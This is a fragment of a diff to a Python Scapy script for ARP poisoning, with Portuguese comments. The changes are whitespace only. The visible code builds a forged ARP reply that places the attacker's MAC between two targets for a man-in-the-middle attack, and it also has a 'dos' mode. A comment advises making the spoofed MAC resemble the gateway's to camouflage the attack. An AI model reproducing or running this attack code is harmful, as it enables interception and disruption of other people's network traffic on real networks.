@@ -58,10 +58,10 @@ elif sys.argv[1] == "dos":
 		# DICA: O campo "hwsrc" carrega o endereço MAC falsificado. #
 		# Afim de camuflar melhor o ataque, mantenha o endereço MAC #
 		# falsificado o mais parecido com o endereço original do    #
-		# gateway. ;)						                                    #
-		#				                                                    #
-		#		     Original	          falso   	                      #
-		# Exemplo:	7c:b2:65:0e:c3:11   7c:b2:65:e0:c3:11	          #
+		# gateway. ;)						    #
+		#							    #
+		#		     Original	          falso   	    #
+		# Exemplo:	7c:b2:65:0e:c3:11   7c:b2:65:e0:c3:11	    #
 		#############################################################
 
 		# Envia os pacotes.
@@ -95,7 +95,7 @@ else:
 	print ("\nMAC do alvo1:", alvo1_mac)
 	print ("MAC do alvo2:", alvo2_mac)
 	print ("\nM1TM 4TT4CK!\n£NV3NEN4ND0")
-  
+	
 	# Cria o pacote ARP Poisoning.
 	pkt=Ether(dst=alvo1_mac , src=alvo2_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo1_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
 
